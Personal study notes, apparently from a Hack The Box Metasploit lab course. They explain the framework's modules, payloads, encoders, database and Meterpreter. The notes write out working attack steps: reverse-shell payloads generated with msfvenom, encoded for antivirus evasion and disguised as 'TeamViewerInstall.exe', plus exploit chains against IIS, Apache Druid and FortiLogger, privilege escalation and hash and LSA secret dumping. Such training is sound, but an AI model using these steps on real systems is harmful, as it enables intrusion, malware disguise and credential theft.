\\\\\\\\\\\\\\
MEtaploit 

-tool some toool leave unpredictable effect, read all doc about tools,
-set audit for tools by a solid methodology for preliminary checks and attack path.
\\Intro to Metaspoit
- includes a suite of tools that use for + test security vulnerabilities, enumerate, network, execute attacks, an evade detection,.
-at core it is a collection of commonly used tools that provide a complete environment for pen testing and exploit dev
\\Metaploit framework console
\\Understanding the Architecture
https://www.cobaltstrike.com/blog/cobalt-strike-rce-active-exploitation-reported
by default all the base files related to metasploit framework can be found under /usr/share/metasploit-framework in our
\\Data documentation lib
these are base files for the framework, the data and lib are the functioning parts of the msfconsole interface, while the doc folder contains all the technical details about the project
\\modules
$ls /usr/share/metasploit-framework/modules
\\Plugin
provide us more flexibility when using the msfconsole since they can easily be manually or automatically loaded as need to provide extra function and automation during assessment
$ls /usr/share/metasploit-framework/plugins/
\\Script
Meterpreter functionality and other usefull scripts
$ls /usr/share/metasploit-framework/scripts/
\\Tools
command-line utilities that can be called directly from the msfconsole menu
ls /usr/share/metasploit-framework/tools/
\\msfconsole
Preparation run it with option -q without banner
$help  
$msfupdate (outsite msfconsole) apt package manager can currently handle the update of modules and feature effortlessly
\\Installing MSF
$sudo apt update && sudo apt install metasploit-framework
this is when we start exploit our target after get enumeration process
-during the enumeration we look at target and identify which public facing services are running on it/http/ftp/what it db/
we need to start with a thorough scan of the target IP addr to determine what service running and what version is installed for each service
- looking for all version, outdated code , 
\\MSF Engagement Structure
MSF engagement structure can be devided into five main categories
+enumeration +preparation +exploitation +privilege escalation +Post-Exploitation
-MSF console engagement structure
\\\\\\\\\===============================
modules
-the exploit cate consits of so-called POC that used to exploit existing vul in largely automated manner.
\\Syntax
$<no.> <type>/<os>/<service>/<name>
\\Example
794 exploit/windows/ftp/scriptftp_list
\\Index No. use after search
\\type
they are set to introduce the structure alongside the interactable ones for better moduarization/
Type	Description
Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
Encoders	Ensure that payloads are intact to their destination.
Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
NOPs	(No Operation code) Keep the payload sizes consistent across exploit attempts.
Payloads	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).
Plugins	Additional scripts can be integrated within an assessment with msfconsole and coexist.
Post	Wide array of modules to gather information, pivot deeper, etc.
-when select a module to use for payload delivery the use <no.> command can only be used with the modules that can be used as initiators 
Type	Description
Auxiliary	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
Exploits	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
Post	Wide array of modules to gather information, pivot deeper, etc.
\\os \\service \\Name \\
\\Searching for modules
$help search  >  $search eternalromance
\\MSF - Specific search
<cve:<year>> (platform:<os>) (type:<Auxiliary/exploit/post>) (rank:<rank>) (<pattern>)
$search type:exploit platform:windows cve:2021 rank:excellent microsoft
\\Module information
$<slected module>info
\\MSF-Target Specification
$set RHOSTS <iptarget>  $set LHOST <ippawn> >>exploit / run
\\\\\\\\\\\\============================
Targets
are unique OS identifier taken from the version of those specific OS which adapt the selected exploit module to run the particular version of the OS.
the show target will display all avail vul target for specific exploit while issue same command in the root menu/ outside any selected exploit module
\\MSF-Show Targets.
msf> show Target
\\Selecting Target
what type of target set for our exploit
incase concern let read info alway know what code behind artifact generation
\\MSF - Target Selection
msf> info looking at the description we can get a general idea of what this exploit accomplish for us
if leaving automatic target MSF will run a target identify 
\\Target typs
to identify a target correctly + Obtain a copy of the target binaries + use msfpescan to locate a suitable return address
\\\\\\\\\\\\\\\=======================================
Payloads
-there three diff type payload: singles, stagers, and stages.this serving diff typologies and type of task
-whether or not a payload is staged is represented by / in the payload name
-EX: windows/shell_bind_tcp is a single payload with no stage. whereas windows/shell/bind_tcp consists of a stager (bind_tcp) and a stage (shell)
\\singles
payload contains the exploit and the entire shellcode for the selected task (all inone)
quite large and run selfpayload run imme after running. EX: adding a user or booting up a process
\\stagers
work with stage payloads to perform a specific task
- a stager waiting on the atk machine ready to establish a connection to the victim host once the stage completes its run on the remote host. Stager are typically used to set up a network connection betw the atk and victim and are designed to be small and reliable.
-MEtaploit will use the best one and fall back to a les-preferred one when necessary
-Windows NX vs. NO-NX Stager
    + Reliability issue for NX CPUs and deeper
    + NX stager are bigger (VirtualAlloc memory)
    + Default is now NX + Win7 Compatible
\\stages
are payload components that are downloaded by stager modules. the various payload stages provide advanced features with no size limits, 
such as Meterpreter, VNC Injection, and others, payload stages automatically use middle stagers:
    + A single recv() fails with large payloads
    + The Stager receives the middle stager
    + The middle stager then performs a Full downloaded
    + also better for RWM
\\Staged Payloads
simply put, an Exploitation process that is modularized and functionally separated to help segregate the diff fuctions it accomplishes into diff code blocks
> each completing its obj individually but working on chaining the atk together. this will ultimately grant an atk remote access to target machine if all the stages work correctly
-The scope of this payload , as  with any others besides granting shell access to the target system, is to be as compact and inconspicuos as possible to aid with the AV/IPS evasion as much as possible
- Stage0 of a staged payload represents the initial shellcode sent over the network to the target machine vul service, which has the sole purpose of initializing a connection back to the attacker machine
>> this is what known as a reverse connection. EX: + reverse_tcp, reverse_https, bind_tcp 
\\MSF - Staged Payloads
$show payloads
Reverse connection are less likely to trigger the prevention systems like the on initializing the conn is the victim host, -> security trust zone (anyway be care full)
>>stage0 aim to set a stable conn >> Stage1 send a large payload 
\\Meterpreter payload
Meterpreter payload is a specific type of multi-faced payload that uses DLL injection to ensure the conn to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes
-Meterpreter resides completely in memory of the remote host and leaves no traces on the hard drive, making it very diff to detect with conventional forenstic techniques, In addition, scripts and plugins can be loaded and unloaded dynamiclally as required
-Once the Meterpreter payload is executed, a new session is created, which spawns up the meterpreter interface. it is very simlimar to the msfconsole interface., but all available commands are aim at the target system, which the payload has infected it offers us a plethora of useful commands, varying from keystroke  capture password hash collection, microphone tapping and screening to impersonating process security tokens, we will delve into more detail about meterpreter in a later Selection
-using meterpreter we can also load in diff plugins to assist us with our assessment 
\\Searching for Payload
depend on what we want to do on the target machine
-we can automate and quickly deliver combined with plugins such as https://github.com/gentilkiwi/mimikatz
parts of the pentest while keeping an organized, time-effective asssessment
\\MSF-list Payloads
$show payloads
-we also can create our payload using msfvenom, 
EX: reverse_tcp_shell, we will using a Meterpreter Payload for Windows 7 (x64)
\\MSF-Searchin for specific payload
$grep meterpreter show payloads
$grep -c meterpreter show payloads
$grep meterpreter grep reverse_tcp show payloads
$grep -c meterpreter grep reverse_tcp show payloads
\\MSF - Select payload
msf> ms_17,... > show options  >  set payload 15
after selecting a payload, we will have more options available to us
\\Using Payloads
Parameter	Description
RHOSTS	The IP address of the remote host, the target machine.
RPORT	Does not require a change, just a check that we are on port 445, where SMB is running.
For the payload part, we will need to set the following:
Parameter	Description
LHOST	The host's IP address, the attacker's machine.
LPORT	Does not require a change, just a check that the port is not already in use.
\\MSF -Exploit and Payload Configuration
msf> ifconfig set rhosts lhost then run exploit 
meterpreter>getuid
-the prompt is not a windows command line one but a Meterpreter prompt, the whoami typically used windows, doesnot work here. instead we can use the linux equivalent of getuid.
\\MSF-Meterpreter commands
$help  
\\MSF-Meterpreter Navigation
$cd Users  > ls >shell  <channel 1> mena conn betw atk -> target established in a reverse TCP connection using Meterpreter Stager and Stage.
the stager was activated on our machine to await a conn request initialized by the Stage payload on the target machine
-Moving to standard shell on the target is helpful in some cases,
\\MSF - Window command
Payload	Description
generic/custom	Generic listener, multi-use
generic/shell_bind_tcp	Generic listener, multi-use, normal shell, TCP connection binding
generic/shell_reverse_tcp	Generic listener, multi-use, normal shell, reverse TCP connection
windows/x64/exec	Executes an arbitrary command (Windows x64)
windows/x64/loadlibrary	Loads an arbitrary x64 library path
windows/x64/messagebox	Spawns a dialog via MessageBox using a customizable title, text & icon
windows/x64/shell_reverse_tcp	Normal shell, single payload, reverse TCP connection
windows/x64/shell/reverse_tcp	Normal shell, stager + stage, reverse TCP connection
windows/x64/shell/bind_ipv6_tcp	Normal shell, stager + stage, IPv6 Bind TCP stager
windows/x64/meterpreter/$	Meterpreter payload + varieties above
windows/x64/powershell/$	Interactive PowerShell sessions + varieties above
windows/x64/vncinject/$	VNC Server (Reflective Injection) + varieties above

HTB{MSF_Expl01t4t10n}
\\\\\\\\\\\==================================
Encoders
have assisted with making payloads compatible with diff processor architectures while at the same time helping with antivirus evasion.
+x64 +x86 + sparc +ppc +mips
-they needed to remove hexadecimal opcodes known as bad characters from the payload. not only but encoding the payload in diff formats could help with the AV detection as mentioned above. 
the use of encoders strictly for AV evasion has diminished over time. as IPS/IDS manufacturers have improved how their protection software deal with signatures in malware and various
-Shikata Ga Nai (SGN) was one of the most utilized encoding schemas back in the day because it was very hard to detect payloads encoded through its mechanism.
-modern detection methods have caugh up, and these encoded payloads are far from being universally undetectable anymore.
-the name It cannot be helped or Nothing can be done about it https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/
\\Selecting an Encoders
msfpayload and msfencode in /usr/share/framework2/
-if we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward
apipe would take the output from one command and feed it into the next
$msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
\\Generating Payload - Without encoding 
$msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
look at the first line $buf and see how it changes when applying an encoder like shikata_ga_nai
\\Generating Payload - With encoding
$msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
\\Shikata Ga Nai encoding
https://hatching.io/blog/metasploit-payloads2/
-want to select an Encoder for an existing payload. then use show encoder to see which encoders are available for  current exploit module + payload
msf> show encoders
some module need compatible encoder
NOTE if we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today.
$msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
>> one better option would be to try running it through mutiple iteration of the same encoding scheme:
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
 -it still not enough to evasion AV.
-alternative  metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payload. it require free regis virustotal
$msf-virustotal -k <API key> -f TeamViewerInstall.exe
\\\\\\\\\\\\\\\\\\==============================
DataBases
used to keep track result, msfconsole has built-in support for the PostgreSQL db system, with it we have direct, quick, and easy access to scan result with added ability to import and export results in conjunction with 3rd party tools. it also can be used to configure exploit module parameters with already existing dindings directly
\\Setting up the DataBases
$sudo service postgresql status
\\Start PostgreSQL
$sudo systemctl start postgresql
-after starting PostgreSQL, we need to create and initialize the MSF database with msfdb init 
\\MSF - Initiate a database
$sudo msfdb init
<some time an error can occur if metasploit is not up to date. this diff tha cause the error can happen for several reasons.
first, often it help to update Metasploit again (apt update) to solve this problem, then we can try to reinitalize the MSF database
$sudo msfdb init
< if the init is skipped and metasploit tells us that the db is already configured , we can recheck the status of the db
$sudo msfdb status
$sudo msfdb init  > start msfconsole  sudo msfdb run > connect to the created db simultaneously
already gave the db configure and are not able to change pw to the MSF username, proceed with these command:
\\MSF - Reinitate the database
$msfdb reinit   >    $cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
$sudo service postgresql restart  >  msfconsole -q    > db_status
\\MSF - Database options
msf> help database   >   db_status
\\Using the Database
workspaces like folder in a project. we can segregate the diff scan results, hosts, and extracted information by IP, subnet, network, or domain.
-to view current workspace list, use the workspace command adding -a or -d switch after the command
msf>workspace -a -d  :add delete
-notice that the default Workspace is named default and is currently in use accodring to the * symbol, type the workspace[name] command switch the presently used workspace/
msf>workspace -a Target_1
$msf> workspace -h 
\\Importing Scan results
\\stored nmap scan
$cat Target.nmap
\\Importing Scan results
$msf>db_import Target.xml    >   hosts   >  services
\\Using Nmap Inside msfconsole
alternative we can use Nmap straight from msfconsole to scan direct from the console without having to background or exit the process use the db_nmap command
\\MSF - Nmap
$msf>db_nmap -sV -sS 10.10.10.8
msf> hosts
\\Data Backup
after finishing the session, make sure to backup our data if anything happen with the PostgreSQL service. todo so. use the db_export command
\\MSF - DB export
$msf>db_export -h > db_export -f xml backup.xml
-other command related to data retention are the exteded use of hosts, services, and the creds and loot commands.
\\hosts
command display a db table automatically populated with the host addr, hostnames, and other information we find about these during our scans and interactios.
-host can be manually added as separate entries in table. after adding our custom hosts, we can akso organize the format and structure of the table, add comments, change existing information
\\MSF - Stored hosts
$msf> hosts -h 
\\services
it contains a table with description and infor on service discovered during scan or interaction.the entries here are highly customizable
\\MSF - stored services of hosts
$msf>services -h 
\\Credentials 
creds command allow to visualize the credentials gathered during interactions with the target host, we can add cred  manually match existing cred with port specification add description
\\MSF - Stored Credentials
$msf>creds -h 
$msf> creds -d -s SMB
\\loot
work in conjuntion with the command above to offer list owned services and user. the loot refers to hash dumps from diff system types, namely hashes, passwd, shadow,..
\\MSF - Stored loot
$msf> loot -h 
\\\\\\\\\\\\\\\\\\\\\======================================
Plugins
everithing is aumomate doc by msfconsole into the db we are usingand hosts, services and vulnerabilities are made avail for user
-plugins work directly with the API and can be used to manipulate the entire framework. they can be useful for automating repetive tasks, adding new commands to the msfconsole, and extending the already powerful atk
\\Using Plugins
ensure it is installed in the correctly dir on our machine, navi /usr/share/metasploit-framework/plugins, 
default dir for every new installation of msfconsole.
$ls /usr/share/metasploit-framework/plugins
\\MSF - Load Nessus
$msf>load Nessus   > nessus_help 
\\Installing new Plugins
-each update parrot os contain new plugin or we take .rb file tp /usr/share/metasploit-framework/plugins with th proper per 
\\Downloading MSF plugins
$git clone https://.... 
$ls Metasploit-plugins   > load plugins
\\Misins
are one of those features that when implemented , offer a large amount of flexibility to both the creator of the script and the sure
-Mixins are classes that act as methods for use by other classes without having tobe the parent class of those other classes
They are mainly used when we:

Want to provide a lot of optional features for a class.
Want to use one particular feature for a multitude of classes.
Most of the Ruby programming language revolves around Mixins as Modules. The concept of Mixins is implemented using the word include, to which we pass the name of the module as a parameter. We can read more about mixins here.
https://en.wikibooks.org/wiki/Metasploit/UsingMixins
\\sessions
msfconsole can manage multiple modules at the same time. Sessions creates dedicated control interface for all of deplyed modules
NOTE: once a session is placed in the background it will continue to run 
\\Using Sessions.
while runing any avail exploits or auxiliary modules in msfconsole, we can background the session as long as they form a channel of comm with the target host. 
press the [CTRL] + [Z] or by typing background command in the case of Meterpreter stages.
\\Listing Active sessions
-we can use the sessions command to view our currently active sessions
msf exploit(windows/smb/psexec_psh)> sessions
\\Interacting with a Session
$sessions -i [no.]
\\Jobs
ex: we scanning but need that port for other module we cannot terminate 
-other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly. even if the session or disappears
\\Viewing the Jobs Command Help menu
$jobs -h
\\Viewing the EXploit Command Help menu
run exploit as a job 
$exploit -j, 
\\Listing Running Jobs
$jobs -language
<test>Find the existing exploit in MSF and use it to get a shell on the target.
What is the username of the user you obtained a shell with?

<test>The target system has an old version of Sudo running. Find the relevant exploit 
and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
\\\\\\\\\\\====================================
Meterpreter (evasion techniques)
is a specific type of multi faceted, extensible Payload tht uses DLL injection to ensure the conn to the victim host is stable and diff to detect using simple check and can be configured to be persistent across reboots or system changes,
it resides entirely in the mem of the remote host and leaves no traces on the hard drive, making it diff to detec with conventional forenstic techniques
-it purpose is to specifically improve our post-exploitation procedures, offering us a hand-pocket set of relevant tools for more straightforward enumeration of the target host from the inside, it can help us find various privilege escalation techniques,AV evasion tech, further vul research, provide persistent accessm pivot, etc
-https://www.rapid7.com/blog/2015/03/25/stageless-meterpreter-payloads/
https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/
\\Running Meterpreter
To run Meterpreter, we only need to select any version of it from the show payloads output, taking into consideration the type of connection and OS we are attacking.

When the exploit is completed, the following events occur:

The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.
The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.
The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.
Lastly, Meterpreter loads extensions. It will always load stdapi and load priv if the module gives administrative rights. All of these extensions are loaded over AES encryption.
-it +Stealthy  +Powerful  +extensible
\\MSF - Scanning Target
msf>db_nmap -sV -p- -T5 -A 10.10.10.15  > hosts >services
search for Microsoft IIS httpd 6.0 CVE-2017-7269
\\MSF - Search for Exploit
msf> search iis_webdav_upload_asp  > use 0 >show options 
-we process to set the needed parameters. LHOST and RHOST 
\\MSF - Configuring Exploit & Payload
set RHOST  > set LHOST tun0  >run
<see the conn log .asp file exist on the target at this very moment,once the meterpreter shell is obtained, it will reside within memory. therefore, the file is not needed, and removal was attemoted by msfconsole, which failed due to access permissions, leaving traces like these is not beneficial to the atks and creates a huge liability
\\MSF-Meterpreter Migration
$meterpreter> getuid  >psexec_psh >steal_token 1836 >getuid
now that we have established at least some privilege level in the system, it is time to eascalate that privilege.
-look around for anything interesting and in the C:\Inetpub\ AdminScripts.
\\MSF-Interacting with the Target
put the current to background and search for new module set the sessions as current, binding the module to it
\\MSF - Session Handling
meterpreter>bg > y > search local_exploit_suggester >use 0 > show options > set Session 1 >run
Going through each separate one, we land on the ms15_051_client_copy_image entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.
\\MSF- Privilege escalation
use exploit/windows/local/ms15_051_client_copy_images > show options >set session 1 > set LHOST tun0 >run >getuid
\now we can proceed to use plethora of Meterpreter functionalities, Ex extracting hashes, impersonating any process we want
\MSF-Dumping hashes
meterpreter>hashdump  >lsa_dump_sam >\
\\MSF- Meterpreter LSA Secrets Dumping
meterpreter>lsa_dump_secrets
From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.
10.129.204.140
<test>Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

<test>Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
$search Apache Druid >use 0 > Set LHOST tun0 > set RHOSTS <target> >exploit >cat /root/flag.txt
--------
$sudo msfdb run >db_nmap -A --top-ports 60 -T5 <targetIP>
<result port 5000, IIS version 10.0 is running FortiLogger, a log and reporting software
$search FortiLogger >use 0>Set LHOST tun0 >set RHOSTS <targetIP> >exploit >shell>whoami
$background > search hashdump >search hashdump post windows >use 3 >set SESSION 1 >run

\\\\\\\\\============================================
Writing and Importing Modules
-search on ExploitDB EX Nagios3 > fund the exploit code Inside ExploitDB entries.
$searchsploit
$searchsploit Nagios3 .rb file will automatically import to msfconsole
$searchsploit -t Nagios3 -- exclude=".py"
/usr/share/metasploit-framework the critical folders are also symlinked in our home and root folders in the hiddent ~/.msf4/ location
\\MSF - Directory Structure
$ls /usr/share/metasploit-framework/
$ls .msf4/
.msf4 location might not have all the folder structure that /usr/share/metasploit-framework/ one might have so we will just need to mkdir the appropriate folders so that the structure is the same as the original folder so that msfconsole can find new modules
NOTE: Please note that there are certain naming conventions that, if not adequately respected, will generate errors when trying to get msfconsole to recognize the new module we installed. Always use snake-case, alphanumeric characters, and underscores instead of dashes.
For example:

nagios3_command_injection.rb
our_module_here.rb
\\MSF- Loading Additional Modules at Runtime
$cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
$msfconsole -m /usr/share/metasploit-framework/modules/
\\MSF-Loading Additional Modules
msf>loadpath /usr/share/metasploit-framework/modules/
